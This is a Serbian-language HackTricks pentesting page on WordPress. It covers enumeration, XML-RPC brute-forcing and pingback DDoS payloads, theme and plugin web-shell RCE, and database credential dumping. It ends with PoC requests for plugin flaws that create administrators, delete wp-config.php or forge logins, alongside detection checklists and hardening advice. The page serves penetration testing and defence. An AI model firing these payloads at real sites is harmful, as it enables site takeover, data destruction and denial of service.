# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** so if you change some php of the theme to get RCE you probably will use that path. For example: Using **theme twentytwelve** you can **access** the **404.php** file in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- In **wp-config.php** you can find the root password of the database.
- Default login paths to check: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` contains useful information such as the version WordPress installed.
- `wp-activate.php` is used for the email activation process when setting up a new WordPress site.
- Login folders (may be renamed to hide it):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` is a file that represents a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism. This type of communication has been replaced by the WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- The `wp-content` folder is the main directory where plugins and themes are stored.
- `wp-content/uploads/` Is the directory where any files uploaded to the platform are stored.
- `wp-includes/` This is the directory where core files are stored, such as certificates, fonts, JavaScript files, and widgets.
- `wp-sitemap.xml` In Wordpress versions 5.5 and greater, Worpress generates a sitemap XML file with all public posts and publicly queryable post types and taxonomies.

**Post exploitation**

- The `wp-config.php` file contains information required by WordPress to connect to the database such as the database name, database host, username and password, authentication keys and salts, and the database table prefix. This configuration file can also be used to activate DEBUG mode, which can useful in troubleshooting.

### Users Permissions

- **Administrator**
- **Editor**: Publish and manages his and others posts
- **Author**: Publish and manage his own posts
- **Contributor**: Write and manage his posts but cannot publish them
- **Subscriber**: Browser posts and edit their profile

## **Passive Enumeration**

### **Get WordPress version**

Check if you can find the files `/license.txt` or `/readme.html`

Inside the **source code** of the page (example from [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS link fajlovi

![](<../../images/image (533).png>)

- JavaScript fajlovi

![](<../../images/image (524).png>)

### Nabavite dodatke
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Preuzmi teme
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Ekstrakcija verzija uop≈°teno
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktivna enumeracija

### Dodaci i teme

Verovatno neƒáete moƒái da pronaƒëete sve dostupne dodatke i teme. Da biste ih sve otkrili, moraƒáete da **aktivno izvr≈°ite Brute Force nad listom dodataka i tema** (nadamo se da postoje automatizovani alati koji sadr≈æe te liste).

### Korisnici

- **ID Brute:** Dobijate validne korisnike sa WordPress sajta Brute Forcing-om korisniƒçkih ID-jeva:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Ako su odgovori **200** ili **30X**, to znaƒçi da je id **va≈æeƒái**. Ako je odgovor **400**, onda je id **neva≈æeƒái**.

- **wp-json:** Takoƒëe mo≈æete poku≈°ati da dobijete informacije o korisnicima upitom:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Jo≈° jedan `/wp-json/` endpoint koji mo≈æe otkriti neke informacije o korisnicima je:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Imajte na umu da ovaj endpoint otkriva samo korisnike koji su napravili post. **Biƒáe prikazane samo informacije o korisnicima koji imaju ovu funkciju omoguƒáenu**.

Takoƒëe imajte na umu da **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: Prilikom prijavljivanja na **`/wp-login.php`** **poruka** je **razliƒçita** i ukazuje na to da li **korisniƒçko ime postoji ili ne**.

### XML-RPC

Ako je aktivan `xml-rpc.php` mo≈æete izvr≈°iti credentials brute-force ili ga koristiti da pokrenete DoS attacks na druge resurse. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

Da biste proverili da li je aktivan, poku≈°ajte pristupiti _**/xmlrpc.php**_ i poslati ovaj zahtev:

**Proveri**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** ili **`metaWeblog.getUsersBlogs`** su neke od metoda koje se mogu koristiti za brute-force credentials. Ako pronaƒëete bilo koju od njih, mo≈æete poslati ne≈°to poput:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Poruka _"Incorrect username or password"_ u odgovoru sa status kodom 200 treba –¥–∞ —Å–µ –ø–æ—ò–∞–≤–∏ –∞–∫–æ –ø–æ–¥–∞—Ü–∏ –∑–∞ –ø—Ä–∏—ò–∞–≤—É –Ω–∏—Å—É –≤–∞–ª–∏–¥–Ω–∏.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Koristeƒái isprav–Ω–µ –ø–æ–¥–∞—Ç–∫–µ –∑–∞ –ø—Ä–∏—ò–∞–≤—É –º–æ–∂–µ—Ç–µ otpremiti fajl. U odgovoru ƒáe se pojaviti putanja ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Takoƒëe postoji **br≈æi naƒçin** za brute-force credentials koristeƒái **`system.multicall`**, jer mo≈æete isprobati vi≈°e credentials u istom zahtevu:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Ova metoda je namenjena programima, ne ljudima, i je stara, zato ne podr≈æava 2FA. Dakle, ako ima≈° valid creds, ali je glavni ulaz za≈°tiƒáen 2FA, **mo≈æda ƒáe≈° moƒái da zloupotrebi≈° xmlrpc.php da se prijavi≈° tim creds-om zaobilazeƒái 2FA**. Imaj na umu da neƒáe≈° moƒái da izvede≈° sve akcije koje mo≈æe≈° iz konzole, ali mo≈æda ipak mo≈æe≈° dostiƒái RCE kako Ippsec obja≈°njava u [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

Ako mo≈æe≈° da pronaƒëe≈° metodu _**pingback.ping**_ u listi, mo≈æe≈° naterati Wordpress da po≈°alje proizvoljan zahtev na bilo koji host/port.\
Ovo se mo≈æe iskoristiti da se **hiljade** Wordpress **sajtova** zamole da pristupe jednoj **lokaciji** (tako se u toj lokaciji izaziva **DDoS**) ili mo≈æe≈° iskoristiti da natera≈° **Wordpress** da **scan** neki interni **network** (mo≈æe≈° navesti bilo koji port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Ako dobijete **faultCode** sa vredno≈°ƒáu **veƒáom** od **0** (17), to znaƒçi da je port otvoren.

Pogledajte upotrebu **`system.multicall`** u prethodnom odeljku da biste nauƒçili kako zloupotrebiti ovu metodu da izazovete DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Ovaj fajl obiƒçno postoji u root-u Wordpress sajta: **`/wp-cron.php`**\
Kada se ovaj fajl **accessed**, izvr≈°ava se jedan "**heavy**" MySQL **query**, pa ga **attackers** mogu iskoristiti da **cause** **DoS**.\
Takoƒëe, po defaultu, `wp-cron.php` se poziva pri svakom uƒçitavanju stranice (kad god klijent zahteva bilo koju Wordpress stranicu), ≈°to kod sajtova sa velikim saobraƒáajem mo≈æe izazvati probleme (DoS).

Preporuƒçuje se onemoguƒáiti Wp-Cron i kreirati pravi cronjob na hostu koji ƒáe izvr≈°avati potrebne zadatke u redovnim intervalima (bez izazivanja problema).

### /wp-json/oembed/1.0/proxy - SSRF

Poku≈°ajte da pristupite _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ i Worpress sajt mo≈æe poslati zahtev ka vama.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Ovaj alat proverava da li postoji **methodName: pingback.ping** i putanja **/wp-json/oembed/1.0/proxy**, i ako postoje, poku≈°ava da ih exploit-uje.

## Automatski alati
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Dobijte pristup prepisivanjem bita

Ovo je vi≈°e radoznalost nego stvaran napad. U CTF-u [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) mogli ste preokrenuti 1 bit u bilo kojoj wordpress datoteci. Tako ste mogli preokrenuti bit na poziciji `5389` u datoteci `/var/www/html/wp-includes/user.php` i NOP-ovati NOT (`!`) operaciju.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modifikacija php fajla iz kori≈°ƒáene teme (admin credentials potrebne)**

Appearance ‚Üí Theme Editor ‚Üí 404 Template (na desnoj strani)

Zamenite sadr≈æaj php fajla shell-om:

![](<../../images/image (384).png>)

Potra≈æite na internetu kako mo≈æete pristupiti toj a≈æuriranoj stranici. U ovom sluƒçaju morate pristupiti ovde: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Mo≈æete koristiti:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
da biste dobili sesiju.

## Plugin RCE

### PHP plugin

Moguƒáe je otpremiti .php fajlove kao plugin.\
Kreirajte svoj php backdoor koristeƒái, na primer:

![](<../../images/image (183).png>)

Zatim dodajte novi plugin:

![](<../../images/image (722).png>)

Otpremite plugin i pritisnite Install Now:

![](<../../images/image (249).png>)

Kliknite na Procced:

![](<../../images/image (70).png>)

Verovatno se ni≈°ta neƒáe dogoditi, ali ako odete u Media, videƒáete da je va≈° shell otpremljen:

![](<../../images/image (462).png>)

Pristupite tome i videƒáete URL za izvr≈°enje reverse shell-a:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Ova metoda podrazumeva instalaciju malicioznog plugina za koji je poznato da je ranjiv i koji se mo≈æe iskoristiti za dobijanje web shell-a. Ovaj proces se izvodi kroz WordPress dashboard na sledeƒái naƒçin:

1. **Plugin Acquisition**: Plugin se dobija iz izvora kao ≈°to je Exploit DB like [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Navigate to the WordPress dashboard, then go to `Dashboard > Plugins > Upload Plugin`.
- Upload the zip file of the downloaded plugin.
3. **Plugin Activation**: Nakon ≈°to je plugin uspe≈°no instaliran, mora se aktivirati kroz dashboard.
4. **Exploitation**:
- Sa instaliranim i aktiviranim pluginom "reflex-gallery", mo≈æe se izvr≈°iti eksploatacija jer je poznato da je ranjiv.
- Metasploit framework pru≈æa exploit za ovu ranjivost. Uƒçitavanjem odgovarajuƒáeg modula i izvr≈°avanjem specifiƒçnih komandi mo≈æe se uspostaviti meterpreter session, ≈°to omoguƒáava neovla≈°ƒáen pristup sajtu.
- Napominje se da je ovo samo jedna od mnogih metoda za iskori≈°ƒáavanje WordPress sajta.

Sadr≈æaj ukljuƒçuje vizuelne prikaze koraka u WordPress dashboard-u za instaliranje i aktiviranje plugina. Meƒëutim, va≈æno je napomenuti da iskori≈°ƒáavanje ranjivosti na ovaj naƒçin predstavlja kriviƒçno delo i neetiƒçno je bez odgovarajuƒáe autorizacije. Ove informacije treba koristiti odgovorno i samo u legalnom kontekstu, kao ≈°to je penetration testing sa eksplicitnim dopu≈°tenjem.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ je skripta dizajnirana da eskalira **Cross-Site Scripting (XSS)** ranjivost u **Remote Code Execution (RCE)** ili druge kritiƒçne ranjivosti u WordPress. Za vi≈°e informacija pogledajte [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Pru≈æa **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ Kreira korisnika u WordPress-u.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Otpremite svoj custom plugin (backdoor) u WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Izmenite ugraƒëene plugine u WordPress-u.
- _**(RCE) Built-In Theme Edit:**_ Izmenite ugraƒëene teme u WordPress-u.
- _**(Custom) Custom Exploits:**_ Prilagoƒëeni exploit-i za third-party WordPress plugine/teme.

## Post Exploitation

Ekstrahujte korisniƒçka imena i lozinke:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Promenite administratorsku lozinku:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Pentest Wordpress dodataka

### Povr≈°ina napada

Poznavanje naƒçina na koji Wordpress dodatak mo≈æe da izlo≈æi funkcionalnost kljuƒçno je za pronala≈æenje ranjivosti u toj funkcionalnosti. U sledeƒáim taƒçkama mo≈æete videti na koje naƒçine dodatak mo≈æe izlo≈æiti funkcionalnost i nekoliko primera ranjivih dodataka u [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Jedan od naƒçina na koji dodatak mo≈æe da izlo≈æi funkcije korisnicima je preko AJAX handlera. Ove funkcije mogu sadr≈æati gre≈°ke u logici, autorizaciji ili autentifikaciji. Takoƒëe, priliƒçno je ƒçesta pojava da te funkcije zasnivaju i autentifikaciju i autorizaciju na postojanju wordpress nonce-a koji **bilo koji autentifikovani korisnik u Wordpress instanci mo≈æe imati** (nezavisno od njegove uloge).

Ovo su funkcije koje se mogu koristiti za izlaganje funkcije u dodatku:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**Kori≈°ƒáenje `nopriv` ƒçini endpoint dostupnim svim korisnicima (ƒçak i neautentifikovanim).**

> [!CAUTION]
> ≈†tavi≈°e, ako funkcija samo proverava autorizaciju korisnika pomoƒáu funkcije `wp_verify_nonce`, ta funkcija samo proverava da li je korisnik prijavljen, obiƒçno ne proverava ulogu korisnika. Dakle, korisnici sa niskim privilegijama mogu imati pristup akcijama visokih privilegija.

- **REST API**

Takoƒëe je moguƒáe izlo≈æiti funkcije iz wordpress registrujuƒái rest AP koristeƒái funkciju `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
`permission_callback` je callback funkcije koja proverava da li je odreƒëeni korisnik ovla≈°ƒáen da pozove API metodu.

**Ako se koristi ugraƒëena funkcija `__return_true`, ona ƒáe jednostavno preskoƒçiti proveru dopu≈°tenja korisnika.**

- **Direktan pristup php fajlu**

Naravno, Wordpress koristi PHP i fajlovi unutar plugins su direktno dostupni preko weba. Dakle, u sluƒçaju da neki plugin izla≈æe ranjivu funkcionalnost koja se aktivira samo pristupom fajlu, ona ƒáe biti eksploatisana od strane bilo kog korisnika.

### Trusted-header REST impersonation (WooCommerce Payments ‚â§ 5.6.1)

Neki plugins implementiraju ‚Äûtrusted header‚Äú preƒçice za interne integracije ili reverse proxies i potom koriste taj header da postave kontekst trenutnog korisnika za REST zahteve. Ako header nije kriptografski povezan sa zahtevom od strane upstream komponente, napadaƒç mo≈æe falsifikovati taj header i pozvati privilegovane REST rute kao administrator.

- Uticaj: neautentifikovano eskaliranje privilegija do admina kreiranjem novog administratora putem core users REST rute.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (forsira user ID 1, tipiƒçno prvi administratorski nalog).
- Exploited route: `POST /wp-json/wp/v2/users` sa nizom koji dodeljuje povi≈°enu ulogu.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Za≈°to ovo radi

- Plugin mapira zaglavlje koje kontroli≈°e klijent na autentifikaciono stanje i preskaƒçe provere privilegija.
- WordPress core oƒçekuje `create_users` capability za ovu rutu; plugin hack ga zaobilazi direktnim postavljanjem konteksta trenutnog korisnika iz zaglavlja.

Oƒçekivani indikatori uspeha

- HTTP 201 sa JSON telom koje opisuje kreiranog korisnika.
- Novi admin korisnik vidljiv u `wp-admin/users.php`.

Kontrolna lista za detekciju

- Grep-ujte za `getallheaders()`, `$_SERVER['HTTP_...']`, ili vendor SDK-ove koji ƒçitaju prilagoƒëena zaglavlja da postave kontekst korisnika (npr. `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Pregledajte REST registracije za privilegovane callback-ove koji nemaju robusne provere `permission_callback` i koji umesto toga zavise od request zaglavlja.
- Potra≈æite upotrebe osnovnih funkcija za upravljanje korisnicima (`wp_insert_user`, `wp_create_user`) unutar REST handlera koje su ograniƒçene samo vrednostima iz zaglavlja.

### Neautentifikovano proizvoljno brisanje fajlova preko wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress teme i pluginovi ƒçesto izla≈æu AJAX handlere preko `wp_ajax_` i `wp_ajax_nopriv_` hook-ova. Kada se koristi varijanta **_nopriv_**, **callback postaje dostupan neautentifikovanim posetiocima**, zato svaka osetljiva akcija mora dodatno da implementira:

1. Proveru privilegija (npr. `current_user_can()` ili bar `is_user_logged_in()`), i
2. CSRF nonce validiran sa `check_ajax_referer()` / `wp_verify_nonce()`, i
3. Strogu sanitaciju / validaciju ulaza.

Litho multipurpose theme (< 3.1) je zaboravio ta 3 kontrolna mehanizma u *Remove Font Family* feature i zavr≈°io isporuƒçujuƒái sledeƒái kod (pojednostavljeno):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Problemi koje uvodi ovaj isjeƒçak:

* **Neautentifikovan pristup** ‚Äì the `wp_ajax_nopriv_` hook je registrovan.
* **No nonce / capability check** ‚Äì bilo koji posetilac mo≈æe pristupiti endpointu.
* **Nema sanitizacije putanje** ‚Äì korisniƒçki kontrolisan `fontfamily` string je konkateniran sa filesystem putanjom bez filtriranja, ≈°to omoguƒáava klasiƒçni `../../` traversal.

#### Eksploatacija

Napadaƒç mo≈æe obrisati bilo koji fajl ili direktorijum **ispod uploads base directory** (obiƒçno `<wp-root>/wp-content/uploads/`) slanjem jednog HTTP POST zahteva:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### Kontrolna lista za detekciju

* Any `add_action( 'wp_ajax_nopriv_...')` callback that calls filesystem helpers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Konkatenacija nefiltriranih korisniƒçkih ulaza u putanje (potra≈æite `$_POST`, `$_GET`, `$_REQUEST`).
* Nedostatak `check_ajax_referer()` i `current_user_can()`/`is_user_logged_in()`.

---

### Eskalacija privilegija kroz vraƒáanje zastarelih uloga i nedostatak autorizacije (ASE "View Admin as Role")

Many plugins implement a "view as role" or temporary role-switching feature by saving the original role(s) in user meta so they can be restored later. If the restoration path relies only on request parameters (e.g., `$_REQUEST['reset-for']`) and a plugin-maintained list without checking capabilities and a valid nonce, this becomes a vertical privilege escalation.

A real-world example was found in the Admin and Site Enhancements (ASE) plugin (‚â§ 7.6.2.1). The reset branch restored roles based on `reset-for=<username>` if the username appeared in an internal array `$options['viewing_admin_as_role_are']`, but performed neither a `current_user_can()` check nor a nonce verification before removing current roles and re-adding the saved roles from user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Za≈°to se mo≈æe iskoristiti

- Veruje `$_REQUEST['reset-for']` i jednoj opciji plugina bez autorizacije na serverskoj strani.
- Ako je korisnik ranije imao veƒáe privilegije saƒçuvane u `_asenha_view_admin_as_original_roles` i bio je degradiran, mo≈æe ih vratiti pristupanjem reset putanji.
- U nekim okru≈æenjima, bilo koji autentifikovani korisnik mo≈æe pokrenuti reset za drugo korisniƒçko ime koje je jo≈° uvek prisutno u `viewing_admin_as_role_are` (neispravna autorizacija).

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Na ranjivim verzijama ovo uklanja trenutne uloge i ponovo dodaje saƒçuvane originalne uloge (npr. `administrator`), efektivno eskalirajuƒái privilegije.

Detection checklist

- Potra≈æite funkcije za menjanje uloge koje ƒçuvaju ‚Äúoriginal roles‚Äù u user meta (npr. `_asenha_view_admin_as_original_roles`).
- Identifikujte putanje za reset/restore koje:
- Uƒçitavaju korisniƒçka imena iz `$_REQUEST` / `$_GET` / `$_POST`.
- Menjaju uloge pomoƒáu `add_role()` / `remove_role()` bez `current_user_can()` i `wp_verify_nonce()` / `check_admin_referer()`.
- Autorizuju na osnovu niza opcija plugina (npr. `viewing_admin_as_role_are`) umesto na osnovu capabilities izvr≈°ioca.

---

### Neautentifikovana eskalacija privilegija preko cookie‚Äëpouzdanog menjanja korisnika na public init (Service Finder ‚Äúsf-booking‚Äù)

Neki pluginovi pove≈æu pomoƒánike za menjanje korisnika na javni `init` hook i izvlaƒçe identitet iz cookie-ja koji kontroli≈°e klijent. Ako kod poziva `wp_set_auth_cookie()` bez provere autentikacije, capabilities i va≈æeƒáeg nonce-a, bilo koji neautentifikovani posetilac mo≈æe prisiliti login kao proizvoljni korisniƒçki ID.

Tipiƒçan ranjiv obrazac (pojednostavljeno iz Service Finder Bookings ‚â§ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // üî• sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Za≈°to se mo≈æe iskoristiti

- Javni `init` hook ƒçini handler dostupan neautentifikovanim korisnicima (nema `is_user_logged_in()` provere).
- Identitet se izvodi iz cookie-ja koji klijent mo≈æe menjati (`original_user_id`).
- Direktan poziv `wp_set_auth_cookie($uid)` prijavljuje zahtevaoca kao tog korisnika bez bilo kakvih capability/nonce provera.

Eksploatacija (neautentifikovano)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### Razmatranja WAF-a za WordPress/plugin CVE-ove

Generic edge/server WAFs su pode≈°eni za ≈°iroke obrasce (SQLi, XSS, LFI). Mnoge visokouticajne WordPress/plugin ranjivosti su specifiƒçne za aplikaciju ‚Äî logiƒçke/auth gre≈°ke ‚Äî koje izgledaju kao benigni saobraƒáaj osim ako engine ne razume WordPress rute i semantiku plugina.

Ofanzivne napomene

- Ciljajte plugin-specifiƒçne endpoint-e sa ƒçistim payload-ovima: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Prvo testirajte neautentifikovane puteve (AJAX `nopriv`, REST sa permisivnim `permission_callback`, javni shortcodes). Podrazumevani payload-ovi ƒçesto uspevaju bez obfuskacije.
- Tipiƒçni sluƒçajevi visokog uticaja: eskalacija privilegija (broken access control), proizvoljni upload/download fajlova, LFI, open redirect.

Odbrambene napomene

- Ne oslanjajte se na generiƒçke WAF signaturne za za≈°titu plugin CVE-ova. Implementirajte virtual patches specifiƒçne za ranjivost na aplikacionom sloju ili a≈æurirajte brzo.
- Preferirajte positive-security provere u kodu (capabilities, nonces, striktna validacija inputa) umesto negativnih regex filtera.

## WordPress Protection

### Regular Updates

Uverite se da su WordPress, plugini i teme a≈æurirani. Takoƒëe potvrdite da je automatsko a≈æuriranje omoguƒáeno u wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Takoƒëe, **instalirajte samo pouzdane WordPress dodatke i teme**.

### Security Plugins

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Other Recommendations**

- Uklonite podrazumevanog **admin** korisnika
- Koristite **jake lozinke** i **2FA**
- Povremeno **pregledajte** korisniƒçke **dozvole**
- **Ograniƒçite poku≈°aje prijave** kako biste spreƒçili Brute Force napade
- Preimenujte fajl **`wp-admin.php`** i dozvolite pristup samo interno ili sa odreƒëenih IP adresa.


### Neautentifikovana SQL Injection usled nedovoljne validacije (WP Job Portal <= 2.3.2)

WP Job Portal plugin za zapo≈°ljavanje izlo≈æio je zadatak **savecategory** koji na kraju izvr≈°ava sledeƒái ranjiv kod unutar `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ‚úó
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **Unsanitised user input** ‚Äì `parentid` dolazi direktno iz HTTP zahteva.
